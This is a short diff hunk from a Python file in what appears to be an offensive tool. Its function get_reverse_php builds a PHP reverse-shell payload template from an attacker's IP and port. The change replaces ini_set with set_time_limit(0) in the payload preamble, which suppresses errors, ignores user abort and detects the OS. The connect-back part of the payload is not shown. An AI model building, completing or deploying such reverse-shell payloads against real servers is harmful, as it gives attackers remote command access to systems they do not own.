@@ -7,7 +7,7 @@ from libs.myapp import send, delay_send, has_env
 def get_reverse_php(ip: str, port: str):
     return """error_reporting (E_ERROR);
 ignore_user_abort(true);
-ini_set("max_execution_time",0);
+set_time_limit(0);
 $os = substr(PHP_OS,0,3);
 $ipaddr = "%s";
 $port = "%s";
